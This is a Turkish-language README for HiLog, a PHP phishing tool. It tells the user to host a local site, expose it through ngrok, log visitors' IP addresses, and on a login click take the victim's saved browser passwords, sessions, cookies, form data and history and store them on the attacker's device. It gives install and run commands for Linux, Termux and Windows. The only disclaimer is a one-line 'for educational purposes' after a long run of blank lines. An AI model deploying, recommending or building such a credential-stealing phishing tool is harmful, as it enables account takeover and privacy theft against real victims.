# HiLog
![image](https://github.com/HeJo-1/HiLog/blob/main/logo.png)

HiLog bir oltalama saldırı toolu dur.

php ile çalışır.

local host da bir site başlatır daha sonrasında bunu ngrok gibi araşlarla public olarak açmanız gerekir.

![image](https://github.com/user-attachments/assets/10274f8b-d641-4f26-a31e-56587879b3a2)


Siteye girince ipv4 ve ipv6 bilgilerini alır.

Giriş butonuna basınca bilgisayarda kayılı olan :

Login Data: Tarayıcıda kaydedilmiş olan şifreler ve oturum bilgileri.

Web Data: Tarayıcının siteye özgü çeşitli verileri (örneğin, formlar, arama geçmişi vb.).

Network\Cookies: Tarayıcıdaki çerezler.

History: Tarayıcının ziyaret ettiği web sitelerinin geçmişi.

Bilgileri alınır ve saldırganın cihazına kayıt eder.
(.txt dosyalarını bir veri tabanı gibi kayıt eder.)
## İndirme & Kurma

### Linux
   ```bash
   git clone https://github.com/HeJo-1/HiLog
   cd HiLog
   python3 linux_install.py
   php -S localhost:8080
```
### Termux 
   ```bash
   git clone https://github.com/HeJo-1/HiLog
   cd HiLog
   python3 termux_install.py
   php -S localhost:8080

```


https://github.com/user-attachments/assets/57c08fb9-49ab-4c39-a429-2eb4eaddd0aa


### Windows
   ```bash
   git clone https://github.com/HeJo-1/HiLog
   cd HiLog
   python3 install_win.py
   php -S localhost:8080
```





























































Eğitim amaçlıdır
